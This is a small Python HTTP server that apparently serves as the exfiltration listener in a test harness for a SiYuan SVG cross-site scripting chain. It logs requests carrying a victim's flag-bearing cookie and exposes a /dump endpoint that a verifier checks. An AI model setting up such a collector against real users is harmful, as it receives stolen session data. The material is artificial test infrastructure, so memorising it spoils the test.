#!/usr/bin/env python3
"""Internal exfil callback for SiYuan SVG XSS (CVE-2026-29183 -> CVE-2026-31809).

Records GET /c?f=<...>. Victim cookie is start-time PCB_FLAG; verify greps the
CURRENT RUN_FLAG in /dump (wrong/stale flag => no match => 10).
"""
import http.server
import urllib.parse
import json

_hits = []


class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        q = urllib.parse.urlparse(self.path)
        if q.path == "/c":
            _hits.append(self.path)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")
        elif q.path == "/dump":
            body = json.dumps(_hits).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        elif q.path == "/reset":
            _hits.clear()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"reset")
        elif q.path == "/health":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    http.server.HTTPServer(("0.0.0.0", 9000), H).serve_forever()
